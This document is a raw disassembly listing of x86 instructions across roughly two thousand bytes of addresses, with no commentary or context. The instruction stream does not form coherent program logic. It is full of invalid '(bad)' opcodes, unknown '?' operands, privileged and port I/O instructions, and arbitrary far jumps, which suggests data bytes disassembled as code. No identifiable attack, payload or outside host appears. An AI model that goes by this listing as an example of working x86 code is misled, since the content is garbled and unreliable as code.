  426b7b:	sub    eax,DWORD PTR [edx-0x7e2b788e]
  426b81:	daa    
  426b82:	lea    edi,[eax+0x24860caa]
  426b88:	mov    BYTE PTR [ebx+0x2],bl
  426b8b:	xchg   ecx,eax
  426b8c:	or     eax,0x92a5315c
  426b91:	add    al,BYTE PTR [edx+0x7e31bfc9]
  426b97:	push   0x5d93ecda
  426b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b9d:	add    eax,0xd8b00db
  426ba2:	push   eax
  426ba3:	pop    edx
  426ba4:	into   
  426ba5:	add    eax,0x3dff0a62
  426baa:	or     bl,BYTE PTR [esi]
  426bac:	stos   BYTE PTR es:[edi],al
  426bad:	mov    esp,0xdcdb976e
  426bb2:	xchg   ebx,eax
  426bb3:	push   ecx
  426bb4:	dec    eax
  426bb5:	jge    0x426b84
  426bb7:	icebp  
  426bb8:	sbb    bh,dh
  426bba:	xor    edi,edx
  426bbc:	xchg   ebp,eax
  426bbd:	inc    esi
  426bbe:	jo     0x426c25
  426bc0:	dec    ebp
  426bc1:	mov    DWORD PTR [ebx],0x66d8650c
  426bc7:	sub    DWORD PTR [eax],ebp
  426bc9:	inc    edx
  426bca:	lds    esp,FWORD PTR [eax-0x5f80ca29]
  426bd0:	pop    es
  426bd1:	add    edx,esi
  426bd3:	jmp    0x7c74:0x618c764e
  426bda:	pop    ds
  426bdb:	push   ebx
  426bdc:	dec    esi
  426bdd:	test   eax,0xe34dee93
  426be2:	mov    ch,0x1c
  426be4:	xchg   ecx,eax
  426be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426be6:	jno    0x426baf
  426be8:	push   0x73
  426bea:	push   ds
  426beb:	sub    eax,0x195f5eb5
  426bf0:	inc    edi
  426bf1:	rol    esp,cl
  426bf3:	and    cl,BYTE PTR [ebx-0x43f493e7]
  426bf9:	loop   0x426bbd
  426bfb:	or     eax,0xd4c57f40
  426c00:	mov    ds:0xc0467d28,eax
  426c05:	popf   
  426c06:	ja     0x426be5
  426c08:	mov    dl,0x23
  426c0a:	lea    ebx,[ecx]
  426c0c:	or     eax,0x531d94f1
  426c11:	add    al,0xe0
  426c13:	fidiv  WORD PTR [ebp+edi*1+0x1e]
  426c17:	shl    DWORD PTR [ebx-0x34],1
  426c1a:	cmp    dl,BYTE PTR [ebp+0x58]
  426c1d:	dec    ebx
  426c1e:	xchg   esi,eax
  426c1f:	aam    0xc0
  426c21:	loope  0x426c88
  426c23:	and    DWORD PTR [ebp-0x79],ebp
  426c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c27:	stos   DWORD PTR es:[edi],eax
  426c28:	mov    edi,ecx
  426c2a:	mov    ch,0x25
  426c2c:	daa    
  426c2d:	cmc    
  426c2e:	jmp    DWORD PTR [ebx+0x25c26be4]
  426c34:	xor    DWORD PTR [eax+0x1f],ecx
  426c37:	sbb    eax,0xab5c3abf
  426c3c:	cmc    
  426c3d:	adc    al,0x1c
  426c3f:	test   DWORD PTR [ebx+0x47],esp
  426c42:	sahf   
  426c43:	mov    ch,0x4f
  426c45:	sar    bl,0xaf
  426c48:	mov    DWORD PTR [edi+0x10b3cab4],ebp
  426c4e:	and    esi,eax
  426c50:	xchg   esp,eax
  426c51:	add    esi,DWORD PTR [esi-0x6669f033]
  426c57:	xlat   BYTE PTR ds:[ebx]
  426c58:	js     0x426c4a
  426c5a:	or     ch,BYTE PTR [edi]
  426c5c:	in     eax,dx
  426c5d:	mov    eax,0x80a02164
  426c62:	adc    al,0x75
  426c64:	dec    esp
  426c65:	pop    ds
  426c66:	sar    eax,cl
  426c68:	push   ebx
  426c69:	sub    DWORD PTR [edi-0x2e],0xe
  426c6d:	add    ah,al
  426c6f:	jmp    0x5c3d0474
  426c74:	stc    
  426c75:	in     eax,0xc9
  426c77:	push   ecx
  426c78:	xchg   edi,eax
  426c79:	adc    DWORD PTR [esi+0x14c25b10],0xcfdd6e03
  426c83:	aad    0x96
  426c85:	and    BYTE PTR [ebx+0x71],0x2c
  426c89:	xchg   esi,eax
  426c8a:	mov    edi,DWORD PTR [edx]
  426c8c:	xchg   ebp,eax
  426c8d:	cmc    
  426c8e:	arpl   dx,bx
  426c90:	and    bl,BYTE PTR [ebp-0x41]
  426c93:	cs addr16 and bl,dh
  426c97:	pop    esi
  426c98:	jns    0x426c7f
  426c9a:	jl     0x426cde
  426c9c:	inc    esp
  426c9d:	push   esp
  426c9e:	push   ds
  426c9f:	sbb    al,BYTE PTR [ecx+0x4a9931a1]
  426ca5:	xchg   ebx,eax
  426ca6:	jge    0x426cbd
  426ca8:	mov    ds:0x58d56840,al
  426cad:	dec    edx
  426cae:	rcr    BYTE PTR [eax+0x4ce20352],0x74
  426cb5:	adc    esp,eax
  426cb7:	xchg   edi,edi
  426cb9:	push   es
  426cba:	pop    ds
  426cbb:	add    ebp,DWORD PTR [ebp+0x5816a36a]
  426cc1:	in     al,dx
  426cc2:	cli    
  426cc3:	aam    0xc6
  426cc5:	fsub   st(2),st
  426cc7:	out    0x6e,eax
  426cc9:	test   dh,cl
  426ccb:	daa    
  426ccc:	xchg   esp,eax
  426ccd:	ret    
  426cce:	nop
  426ccf:	hlt    
  426cd0:	cmp    DWORD PTR [edx],eax
  426cd2:	or     BYTE PTR [esi+esi*4],bh
  426cd5:	fcom   DWORD PTR [edx-0x29]
  426cd8:	push   es
  426cd9:	es dec ebx
  426cdb:	cmp    BYTE PTR [edx-0x3822a9a3],bl
  426ce1:	lea    edx,[ebx]
  426ce3:	ins    DWORD PTR es:[edi],dx
  426ce4:	mov    BYTE PTR [ebp-0x7b29c2e],ah
  426cea:	push   eax
  426ceb:	mul    DWORD PTR ds:0x94e00202
  426cf1:	sahf   
  426cf2:	sub    al,0x86
  426cf4:	cmp    DWORD PTR [ebx+0x1f],edx
  426cf7:	gs mov esi,0x4e9f9c5f
  426cfd:	loopne 0x426cdf
  426cff:	aad    0x71
  426d01:	test   DWORD PTR [edi+0x26],0xa9914c3a
  426d08:	mov    cl,BYTE PTR [ebx]
  426d0a:	push   es
  426d0b:	mov    eax,0x73f4eb8b
  426d10:	jo     0x426c93
  426d12:	fs aam 0x79
  426d15:	sub    al,0xb9
  426d17:	int    0x2
  426d19:	add    al,0xf
  426d1b:	stos   DWORD PTR es:[edi],eax
  426d1c:	mov    BYTE PTR [ebp-0x21a3a05a],cl
  426d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d23:	mov    bh,ah
  426d25:	add    eax,0x41d6288c
  426d2a:	sbb    ebx,DWORD PTR [esi+0x4764daaf]
  426d30:	div    bl
  426d32:	cmp    bh,BYTE PTR [edx-0x684d7edf]
  426d38:	mov    edx,DWORD PTR [edx-0x37]
  426d3b:	or     DWORD PTR [ebx+ebx*1],esi
  426d3e:	std    
  426d3f:	std    
  426d40:	jl     0x426d9a
  426d42:	push   ds
  426d43:	adc    eax,0x3285644d
  426d48:	out    0x86,eax
  426d4a:	jbe    0x426d12
  426d4c:	sbb    DWORD PTR [ebp+0x728640f9],eax
  426d52:	mov    ds:0x3c6284c5,eax
  426d57:	cmp    al,0x7a
  426d59:	scas   al,BYTE PTR es:[edi]
  426d5a:	cmp    ah,BYTE PTR [edi]
  426d5c:	les    ecx,FWORD PTR [eax-0x32]
  426d5f:	adc    ebp,DWORD PTR ds:0x3bb8b802
  426d65:	imul   eax,DWORD PTR [eax+0x6a005368],0x35
  426d6c:	pop    ds
  426d6d:	(bad)  
  426d6e:	jne    0x426d93
  426d70:	mov    WORD PTR [edx-0x52],fs
  426d73:	add    DWORD PTR [ecx+0x48a7bd6b],ecx
  426d79:	loopne 0x426db0
  426d7b:	js     0x426d8d
  426d7d:	add    al,BYTE PTR [eax-0x6539fd65]
  426d83:	gs out dx,al
  426d85:	mov    eax,ds:0x30e219a
  426d8a:	ds push esi
  426d8c:	data16 rcr BYTE PTR [edx+edx*1-0xe5fd54],cl
  426d94:	sbb    bh,dh
  426d96:	out    dx,al
  426d97:	mov    ch,0x2c
  426d99:	cmp    DWORD PTR [edi+0x6189cd4f],ecx
  426d9f:	test   BYTE PTR [ebp+0x60],dl
  426da2:	sub    bl,BYTE PTR [edx+0x75]
  426da5:	daa    
  426da6:	fsubr  QWORD PTR [ebp-0x3e]
  426da9:	fcmovnu st,st(7)
  426dab:	push   eax
  426dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dad:	jnp    0x426de0
  426daf:	sbb    cl,BYTE PTR [edi+0x1c0d9b59]
  426db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426db6:	add    DWORD PTR [edi],esp
  426db8:	push   ss
  426db9:	je     0x426e34
  426dbb:	sar    ebp,cl
  426dbd:	fs stos DWORD PTR es:[edi],eax
  426dbf:	mov    eax,ds:0xbd1c7ae8
  426dc4:	xchg   ebp,eax
  426dc5:	xchg   esp,eax
  426dc6:	pushf  
  426dc7:	cmp    esp,esp
  426dc9:	loop   0x426e2a
  426dcb:	out    dx,al
  426dcc:	fistp  DWORD PTR [edx+0x68713aec]
  426dd2:	pop    ds
  426dd3:	xchg   ebx,eax
  426dd4:	retf   0x22c
  426dd7:	cmp    al,0x9c
  426dd9:	ret    
  426dda:	xor    dl,bh
  426ddc:	sbb    eax,0x941dabb
  426de1:	fbld   TBYTE PTR [edx+0xf]
  426de4:	cmp    ebp,0x28
  426de7:	cmp    ah,BYTE PTR [edi+edi*1]
  426dea:	sahf   
  426deb:	aam    0x2e
  426ded:	mov    al,0xe4
  426def:	popf   
  426df0:	fcmovnbe st,st(5)
  426df2:	pop    esp
  426df3:	aad    0x11
  426df5:	and    DWORD PTR es:0x8d65bbfd,edi
  426dfc:	inc    ecx
  426dfd:	arpl   WORD PTR [ecx-0x648a5072],si
  426e03:	jb     0x426e6d
  426e05:	add    dh,BYTE PTR [esi+0x3c]
  426e08:	(bad)  
  426e09:	adc    DWORD PTR [ebp-0x6fb33185],edi
  426e0f:	inc    ecx
  426e10:	test   al,0x2
  426e12:	adc    al,0x24
  426e14:	test   dh,0xeb
  426e17:	in     al,dx
  426e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e19:	add    eax,0x784e5766
  426e1e:	mov    esp,?
  426e20:	pop    ss
  426e21:	cmp    cl,BYTE PTR ds:0x12b67fb2
  426e27:	mov    esp,0xe4c51d88
  426e2c:	jne    0x426e2a
  426e2e:	dec    ebp
  426e2f:	fwait
  426e30:	sbb    al,BYTE PTR [edx]
  426e32:	mov    al,BYTE PTR [ecx]
  426e34:	test   eax,0x886a9ebd
  426e39:	pop    edx
  426e3a:	daa    
  426e3b:	jne    0x426dd1
  426e3d:	punpckldq mm5,DWORD PTR [ebx-0x72543a6a]
  426e44:	bound  ebp,QWORD PTR [ebx-0x4b]
  426e47:	aam    0x34
  426e49:	lods   al,BYTE PTR ds:[esi]
  426e4a:	mov    ?,WORD PTR [esi]
  426e4c:	test   eax,0x8870c8e1
  426e51:	inc    ebx
  426e52:	(bad)  
  426e53:	inc    BYTE PTR [ebx-0x15]
  426e56:	icebp  
  426e57:	mov    ebx,ebp
  426e59:	add    eax,0x4ad08936
  426e5e:	fs lock mov dh,0xd6
  426e62:	pop    ds
  426e63:	or     esp,DWORD PTR [esp+ebp*1+0x50]
  426e67:	scas   eax,DWORD PTR es:[edi]
  426e68:	repnz mov ah,BYTE PTR [eax-0x1c786ceb]
  426e6f:	adc    al,0x9c
  426e71:	outs   dx,DWORD PTR ds:[esi]
  426e72:	mov    eax,ds:0x1f8ebb5a
  426e77:	mov    BYTE PTR [ebp+0x50f3a19f],bl
  426e7d:	jb     0x426e9e
  426e7f:	scas   eax,DWORD PTR es:[edi]
  426e80:	inc    ecx
  426e82:	cmp    al,BYTE PTR [esi+0x56]
  426e85:	fnsave [eax+0x757f96d5]
  426e8b:	jp     0x426ee2
  426e8d:	ins    BYTE PTR es:[edi],dx
  426e8e:	mov    edx,DWORD PTR [edx]
  426e90:	mov    DWORD PTR [edi+0x2e],esi
  426e93:	adc    ah,0x5e
  426e96:	jecxz  0x426ef0
  426e98:	sbb    DWORD PTR ds:0x71dca988,edx
  426e9e:	stc    
  426e9f:	xchg   esp,eax
  426ea0:	xor    DWORD PTR [edx],esp
  426ea2:	sub    BYTE PTR [ecx],ch
  426ea4:	mov    DWORD PTR [ecx+0x2fe7fe13],esp
  426eaa:	push   0x65
  426eac:	inc    edi
  426ead:	add    ecx,DWORD PTR [eax+eax*1-0x4335e0c3]
  426eb4:	adc    esp,edi
  426eb6:	pusha  
  426eb7:	jge    0x426e75
  426eb9:	imul   ebx,DWORD PTR [ebx+0x4dd1d451],0xffffffd4
  426ec0:	jle    0x426ef0
  426ec2:	inc    ecx
  426ec3:	mov    edx,0xd27b9b6b
  426ec8:	mov    ebp,ecx
  426eca:	pusha  
  426ecb:	ds jmp 0xe927252c
  426ed1:	popf   
  426ed2:	mov    dh,0xd5
  426ed4:	sti    
  426ed5:	repz sbb BYTE PTR [ebx],bl
  426ed8:	cmp    BYTE PTR [edx+ecx*8-0x2c1a778b],0xa3
  426ee0:	data16 ds jno 0x426f11
  426ee4:	into   
  426ee5:	add    eax,0x9e3376d0
  426eea:	stos   DWORD PTR es:[edi],eax
  426eeb:	ins    BYTE PTR es:[edi],dx
  426eec:	inc    ebp
  426eed:	mov    fs,WORD PTR [eax+0x45]
  426ef0:	retf   
  426ef1:	sbb    bh,BYTE PTR [ebx+0x5c3364bb]
  426ef7:	mov    edx,0xc7c0ad7c
  426efc:	aad    0xbd
  426efe:	mov    al,ds:0x4da8f91b
  426f03:	arpl   bp,si
  426f05:	frstor [esp+edx*8]
  426f08:	aaa    
  426f09:	sbb    eax,ecx
  426f0b:	inc    eax
  426f0c:	mov    esp,0xb9ad8df8
  426f11:	lock mov edx,DWORD PTR [ecx+0x7e]
  426f15:	add    ecx,DWORD PTR [ecx]
  426f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f18:	push   0x88120fd3
  426f1d:	gs cmp eax,0x63eaf747
  426f23:	xchg   ebp,esi
  426f25:	add    eax,0xcc0a35c0
  426f2a:	xchg   esi,eax
  426f2b:	outs   dx,DWORD PTR ds:[esi]
  426f2c:	dec    edi
  426f2d:	add    eax,0x3a3d996d
  426f32:	sar    BYTE PTR [eax],0xf7
  426f35:	vpaddsb xmm4,xmm6,XMMWORD PTR [ebx+0x6c]
  426f3a:	stos   DWORD PTR es:[edi],eax
  426f3b:	inc    esi
  426f3c:	test   edx,ebx
  426f3e:	pusha  
  426f3f:	sahf   
  426f40:	and    eax,0xe1d039fc
  426f45:	jnp    0x426f65
  426f47:	add    ecx,DWORD PTR [ebx]
  426f49:	test   eax,0x28dc71ef
  426f4e:	sub    dh,BYTE PTR [ebp+ecx*4+0x2]
  426f52:	ins    BYTE PTR es:[edi],dx
  426f53:	js     0x426fc7
  426f55:	jo     0x426f33
  426f57:	add    ch,BYTE PTR [eiz*1-0x1076c7e6]
  426f5e:	push   esp
  426f5f:	outs   dx,BYTE PTR ds:[esi]
  426f60:	fs jbe 0x426ef7
  426f63:	xchg   edi,eax
  426f64:	xchg   ebx,eax
  426f65:	add    eax,0x3606f382
  426f6a:	(bad)  
  426f6b:	loope  0x426fec
  426f6d:	gs pop ds
  426f6f:	jg     0x426f04
  426f71:	mov    ah,0x7e
  426f73:	xchg   edx,eax
  426f74:	outs   dx,BYTE PTR ds:[esi]
  426f75:	mov    ebp,0xe375d7f3
  426f7a:	sbb    edx,0x54
  426f7d:	jae    0x426f31
  426f7f:	xor    eax,0xfd61839a
  426f84:	call   DWORD PTR [ecx+0x75130424]
  426f8a:	pop    esi
  426f8b:	scas   eax,DWORD PTR es:[edi]
  426f8c:	inc    ebp
  426f8d:	add    cl,BYTE PTR [eax-0x20e8e53d]
  426f93:	cmp    eax,0xedbc88bf
  426f98:	jmp    0xee8f8ed6
  426f9d:	pusha  
  426f9e:	je     0x426ff6
  426fa0:	jo     0x426fa5
  426fa2:	ins    BYTE PTR es:[edi],dx
  426fa3:	(bad)  
  426fa4:	aam    0x74
  426fa6:	jo     0x426f32
  426fa8:	retf   0x1e3e
  426fab:	icebp  
  426fac:	push   ss
  426fad:	sub    eax,DWORD PTR [edi+0x53164c2f]
  426fb3:	enter  0x33b,0xac
  426fb7:	mov    ah,0x91
  426fb9:	inc    edi
  426fba:	lods   eax,DWORD PTR ds:[esi]
  426fbb:	gs push esp
  426fbd:	jmp    0x2431b99
  426fc2:	js     0x426f7a
  426fc4:	outs   dx,DWORD PTR ds:[esi]
  426fc5:	jnp    0x427017
  426fc7:	jb     0x426fe7
  426fc9:	stc    
  426fca:	mov    ch,0xd7
  426fcc:	cmp    eax,0xbc0d323b
  426fd1:	mov    ds:0xf0070c2f,eax
  426fd6:	pusha  
  426fd7:	mov    ds:0x2f811eb3,eax
  426fdc:	inc    ecx
  426fdd:	loope  0x426ff2
  426fdf:	fbld   TBYTE PTR [esi+esi*8-0x4e82d32]
  426fe6:	and    dl,dl
  426fe8:	(bad)  
  426fe9:	sbb    DWORD PTR [edi+0x1f2a3794],0x769c986f
  426ff3:	inc    ebx
  426ff4:	xchg   esi,eax
  426ff5:	(bad)  
  426ff6:	rcl    ch,0xdb
  426ff9:	sbb    eax,0xc4a03755
  426ffe:	nop
  426fff:	rcr    DWORD PTR [ebp+ecx*4-0x21],cl
  427003:	test   BYTE PTR [ecx-0x6ae72c7],0x2e
  42700a:	ss repnz sti 
  42700d:	sub    esi,ebx
  42700f:	loopne 0x42702e
  427011:	pop    ebx
  427012:	sahf   
  427013:	jne    0x42702e
  427015:	adc    esi,DWORD PTR [ecx]
  427017:	popa   
  427018:	mov    al,BYTE PTR [ebx-0xd4f4f46]
  42701e:	sbb    DWORD PTR [edx],ecx
  427020:	push   0xcad5f835
  427025:	cdq    
  427026:	sti    
  427027:	cwde   
  427028:	in     eax,dx
  427029:	int3   
  42702a:	ret    
  42702b:	or     DWORD PTR [eax-0x396351c1],0xfffffff4
  427032:	sbb    edx,DWORD PTR [edi-0x1609c09b]
  427038:	imul   eax,DWORD PTR [edx],0x10cf7c46
  42703e:	xchg   DWORD PTR [edx+0x8f73d89],ebp
  427044:	push   edi
  427045:	push   ebx
  427046:	add    dh,bl
  427048:	dec    edx
  427049:	add    dl,BYTE PTR [esi]
  42704b:	mov    bh,0x8f
  42704d:	nop
  42704e:	fcmovnb st,st(4)
  427050:	xor    eax,0x54591f8a
  427055:	inc    ebp
  427056:	jno    0x427007
  427058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427059:	int    0xbe
  42705b:	aad    0x80
  42705d:	add    al,0xe3
  42705f:	jno    0x427087
  427061:	cli    
  427062:	sub    al,BYTE PTR [ecx+edi*8-0x71]
  427066:	sar    BYTE PTR [edx-0x6bb8d2b6],0xa6
  42706d:	sbb    BYTE PTR [ebp+0x6656f4af],dh
  427073:	sub    ah,BYTE PTR [esi-0x177595fb]
  427079:	adc    DWORD PTR [edi+0x31138940],ebx
  42707f:	shr    edi,0x67
  427082:	int3   
  427083:	or     BYTE PTR ds:0xf842b61d,cl
  427089:	in     al,dx
  42708a:	mov    esi,0x5c8340ec
  42708f:	(bad)  
  427090:	ss jg  0x427093
  427093:	jbe    0x42701d
  427095:	dec    edi
  427096:	loope  0x427079
  427098:	add    BYTE PTR [esp+eax*8+0x1202cb11],bl
  42709f:	jl     0x427107
  4270a1:	repnz loopne 0x4270c7
  4270a4:	jle    0x427035
  4270a6:	pop    ds
  4270a7:	mov    edi,0xacf94a87
  4270ac:	xor    ah,BYTE PTR ds:0x1d68fdde
  4270b2:	ret    0xe8
  4270b5:	lahf   
  4270b6:	loop   0x42712d
  4270b8:	call   0x8725325f
  4270bd:	lea    ecx,[eax+eiz*4+0x7ebff80d]
  4270c4:	dec    ecx
  4270c5:	fist   DWORD PTR [esi+0x59406d5e]
  4270cb:	xor    edx,DWORD PTR [ebx-0x3e01177b]
  4270d1:	inc    esi
  4270d2:	mov    ebx,0xcee58851
  4270d7:	jno    0x427114
  4270d9:	in     eax,dx
  4270da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270db:	in     al,dx
  4270dc:	dec    ebx
  4270dd:	add    edx,DWORD PTR [ebx+edi*8+0x13879985]
  4270e4:	push   0xffffffde
  4270e6:	jge    0x42709d
  4270e8:	cmc    
  4270e9:	mov    ecx,0x4b139476
  4270ee:	mov    esp,0xa8033d71
  4270f3:	jg     0x42711d
  4270f5:	icebp  
  4270f6:	(bad)  
  4270f7:	(bad)  
  4270f8:	xlat   BYTE PTR ds:[ebx]
  4270f9:	sbb    al,0x1f
  4270fb:	arpl   bx,dx
  4270fd:	js     0x4270bd
  4270ff:	cmp    eax,0xd72bb2f8
  427104:	jo     0x4270c1
  427106:	dec    edx
  427107:	fist   DWORD PTR [esi+ebx*2-0x7b]
  42710b:	mov    cl,0x35
  42710d:	out    dx,al
  42710e:	bound  edi,QWORD PTR [edi-0xfb5cf6e]
  427114:	push   eax
  427115:	push   ebx
  427116:	dec    eax
  427117:	xlat   BYTE PTR ds:[ebx]
  427118:	popa   
  427119:	jo     0x42718d
  42711b:	adc    BYTE PTR [esi],0xb5
  42711e:	sbb    BYTE PTR [edi],bh
  427120:	xchg   edi,eax
  427121:	mov    edi,0x7f3f937c
  427126:	popf   
  427127:	mov    cl,0x89
  427129:	ins    DWORD PTR es:[edi],dx
  42712a:	mov    eax,0x260caea0
  42712f:	shr    dl,cl
  427131:	(bad)  
  427132:	mov    ah,0xad
  427134:	xchg   ebx,eax
  427135:	adc    bh,bh
  427137:	cwde   
  427138:	stos   DWORD PTR es:[edi],eax
  427139:	mov    eax,ds:0x2d97571f
  42713e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42713f:	dec    ebp
  427140:	das    
  427141:	mov    DWORD PTR [edx+0x47],ebx
  427144:	mov    al,BYTE PTR [ebx+0x4340c360]
  42714a:	push   esi
  42714b:	stos   DWORD PTR es:[edi],eax
  42714c:	inc    edi
  42714d:	jmp    0x4485c471
  427152:	push   ss
  427153:	sti    
  427154:	adc    BYTE PTR [ebx+0x271d498],ah
  42715a:	(bad)  
  42715b:	mov    ds:0xd7727840,al
  427160:	mov    esp,DWORD PTR [ecx+0x2f]
  427163:	inc    edi
  427164:	pop    ecx
  427165:	hlt    
  427166:	add    eax,DWORD PTR [edi-0x553310b8]
  42716c:	jb     0x427191
  42716e:	enter  0x3abf,0xc3
  427172:	sub    BYTE PTR [edx+0xf6d0afe],cl
  427178:	jp     0x42719e
  42717a:	arpl   WORD PTR [edi+0x49],bp
  42717d:	push   edx
  42717e:	adc    ebp,ecx
  427180:	mov    eax,DWORD PTR ds:0xf1c5e0f6
  427186:	xlat   BYTE PTR ds:[ebx]
  427187:	outs   dx,DWORD PTR ds:[esi]
  427188:	stos   BYTE PTR es:[edi],al
  427189:	cmp    al,0x1e
  42718b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42718c:	in     al,dx
  42718d:	mov    ds:0xa1b0cd2a,al
  427192:	(bad)  
  427193:	mov    eax,0x3ab5110a
  427198:	inc    edx
  427199:	outs   dx,DWORD PTR ds:[esi]
  42719a:	xor    eax,0xe54ecad4
  42719f:	fimul  DWORD PTR [esi-0x76efef24]
  4271a5:	popf   
  4271a6:	loopne 0x42719b
  4271a8:	push   edi
  4271a9:	sub    ecx,DWORD PTR [ebx+0x76245448]
  4271af:	inc    edi
  4271b0:	cs ret 0x56ed
  4271b4:	and    ebp,0x75
  4271b7:	sub    DWORD PTR ds:0x8eb31f6c,esp
  4271bd:	mov    bl,0x90
  4271bf:	push   ecx
  4271c0:	push   es
  4271c1:	push   ecx
  4271c2:	mov    WORD PTR [ebx+0x9f98846],gs
  4271c8:	rol    DWORD PTR [edx-0x7879f8eb],0x1f
  4271cf:	inc    ebx
  4271d0:	inc    ebx
  4271d1:	jbe    0x42722f
  4271d3:	loopne 0x42720f
  4271d5:	or     BYTE PTR [edx],bh
  4271d7:	xlat   BYTE PTR ds:[ebx]
  4271d8:	and    DWORD PTR [ebp+0x7c],esi
  4271db:	push   ecx
  4271dc:	mov    eax,0x8975841c
  4271e1:	inc    ebx
  4271e2:	stc    
  4271e3:	out    dx,al
  4271e4:	cli    
  4271e5:	sub    BYTE PTR [esi],al
  4271e7:	jl     0x4271e5
  4271e9:	add    dh,BYTE PTR [esi-0x637ba777]
  4271ef:	xchg   edi,eax
  4271f0:	arpl   si,cx
  4271f2:	sbb    BYTE PTR [ebx-0x19e03759],bh
  4271f8:	inc    ebx
  4271f9:	mov    bh,0xbb
  4271fb:	add    ecx,DWORD PTR [eax-0x22f2b353]
  427201:	or     BYTE PTR [edx+0x44144c98],dh
  427207:	push   edx
  427208:	pushf  
  427209:	and    ecx,ebp
  42720b:	aam    0xf3
  42720d:	cli    
  42720e:	shl    DWORD PTR [ebx-0x6c],1
  427211:	rol    DWORD PTR [esp+ecx*4-0x299bfc8f],0x6
  427219:	push   es
  42721a:	shr    BYTE PTR [ebx+0x13017301],0x4e
  427221:	ret    
  427222:	sbb    DWORD PTR [esi+0x437d8326],edx
  427228:	adc    bl,BYTE PTR [ecx]
  42722a:	repnz adc al,0x2c
  42722d:	clc    
  42722e:	xor    ch,BYTE PTR [ebx-0x69]
  427231:	add    al,BYTE PTR [esi-0x2aa2ae18]
  427237:	aaa    
  427238:	jno    0x42721d
  42723a:	(bad)
  42723f:	inc    ecx
  427240:	in     eax,dx
  427241:	and    bh,bl
  427243:	pusha  
  427244:	sbb    eax,DWORD PTR [ebx]
  427246:	fcom   DWORD PTR [esi]
  427248:	add    al,BYTE PTR [eax-0x51]
  42724b:	ds inc ecx
  42724d:	in     al,dx
  42724e:	and    edi,DWORD PTR ds:0x1a049b88
  427254:	out    dx,eax
  427255:	pop    ss
  427256:	arpl   di,cx
  427258:	xchg   ebx,eax
  427259:	add    eax,0x8e89cdfa
  42725e:	movhps QWORD PTR [ebx+ecx*4+0x1f],xmm4
  427263:	mul    DWORD PTR [edi]
  427265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427266:	cmp    BYTE PTR [esi],0x28
  427269:	out    0x4c,al
  42726b:	aad    0xde
  42726d:	out    dx,eax
  42726e:	mov    ch,0xb8
  427270:	(bad)  
  427272:	lods   eax,DWORD PTR ds:[esi]
  427273:	test   BYTE PTR [eax-0x47310d47],cl
  427279:	fistp  WORD PTR [ecx+0x7005b73a]
  42727f:	enter  0xcf6b,0xf4
  427283:	jbe    0x4272ba
  427285:	lds    esp,FWORD PTR [eax-0x2d]
  427288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427289:	mov    ecx,0xfbda5606
  42728e:	lock rcl BYTE PTR [edi+0x4ceade02],0xcd
  427296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427297:	xchg   ebx,eax
  427298:	adc    eax,0x895514b4
  42729d:	mov    eax,ds:0xac343b51
  4272a2:	das    
  4272a3:	mov    ebp,0x856a028e
  4272a8:	shr    BYTE PTR [eax+0x3bce9b8a],0xa
  4272af:	stc    
  4272b0:	mov    BYTE PTR [edi],cl
  4272b2:	adc    al,0xd5
  4272b4:	xchg   ecx,eax
  4272b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272b6:	cmc    
  4272b7:	(bad)  
  4272b8:	jae    0x4272bd
  4272ba:	dec    esi
  4272bb:	call   0x2fd3:0x7d5f7b22
  4272c2:	push   ds
  4272c3:	fld    QWORD PTR [esi+0xf]
  4272c6:	push   edi
  4272c7:	xchg   ebx,eax
  4272c8:	push   eax
  4272c9:	xchg   ebx,eax
  4272ca:	ja     0x4272a1
  4272cc:	jl     0x427301
  4272ce:	ja     0x4272de
  4272d0:	add    dl,bl
  4272d2:	mov    al,0x7e
  4272d4:	xchg   BYTE PTR [ebx+0x2],ch
  4272d7:	jb     0x42734f
  4272d9:	jae    0x427359
  4272db:	fst    QWORD PTR ds:0xf25bf24c
  4272e1:	adc    DWORD PTR [ebp-0x79],ebp
  4272e4:	add    esi,DWORD PTR [esi+0x47]
  4272e7:	je     0x4272ed
  4272e9:	adc    al,0xc1
  4272eb:	mov    edx,0x1249cbc4
  4272f0:	or     DWORD PTR [edi+0x1509f86a],0x45
  4272f7:	dec    esi
  4272f8:	inc    esi
  4272f9:	add    bl,dl
  4272fb:	js     0x427371
  4272fd:	sub    BYTE PTR [ebx],0xbf
  427300:	xchg   esi,eax
  427301:	adc    cl,BYTE PTR [ecx]
  427303:	push   edi
  427304:	xchg   edx,eax
  427305:	dec    esi
  427306:	push   ds
  427307:	and    eax,0x178c7f5b
  42730c:	cmp    DWORD PTR [ebp+0x49],edi
  42730f:	leave  
  427310:	push   0x2
  427312:	es push cs
  427314:	push   ecx
  427315:	sub    BYTE PTR [edx-0xb],bh
  427318:	adc    BYTE PTR [edx-0x7d70f49f],bl
  42731e:	mov    ebp,0xf7f54fb2
  427323:	jp     0x427324
  427325:	add    BYTE PTR [esi+eiz*2+0x5533280b],al
  42732c:	xchg   BYTE PTR [edx+0x6e105620],dh
  427332:	cmp    eax,0x2419e8d6
  427337:	inc    ecx
  427338:	ja     0x427375
  42733a:	das    
  42733b:	jmp    0x4272ef
  42733d:	mov    ds:0xdf31424b,eax
  427342:	ss daa 
  427344:	add    eax,0xdefd73a0
  427349:	add    esp,DWORD PTR [edx+0x621e85d2]
  42734f:	push   ds
  427350:	mov    DWORD PTR [esi+eax*4],edi
  427353:	mov    ah,0x95
  427355:	sti    
  427356:	pop    esp
  427357:	inc    ecx
  427358:	mov    al,BYTE PTR [edx]
  42735a:	stos   BYTE PTR es:[edi],al
  42735b:	xchg   ebp,eax
  42735c:	ret    0x392a
  42735f:	aam    0x22
